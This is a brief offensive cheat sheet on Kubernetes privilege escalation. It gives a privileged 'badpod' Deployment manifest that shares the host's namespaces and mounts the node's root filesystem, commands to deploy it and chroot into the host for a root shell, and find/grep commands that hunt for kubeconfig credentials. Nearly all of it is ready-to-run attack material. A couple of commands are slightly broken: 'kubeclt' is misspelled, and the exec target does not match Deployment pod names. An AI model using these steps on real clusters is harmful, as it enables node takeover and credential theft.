# Kubernetes 

## Privilege Escalation

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: badpod
  labels:
    app: badpod
    type: deployment
spec:
  replicas: 2
  selector:
    matchLabels:
      app: badpod
      type: deployment
  template:
    metadata:
      labels:
        app: badpod
        type: deployment
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: badpod
        image: ubuntu
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
      volumes:
      - name: noderoot
        hostPath:
          path: /

```

Deploy and get Shell
```
kubeclt apply -f badpod.yaml
kubectl exec -it badpod -- chroot /host bash
```

locate credentials
```
find / -name kubeconfig
find / -name .kube
grep -R "current-context" /home/
grep -R "current-context" /root/
```



### References:
https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed
https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
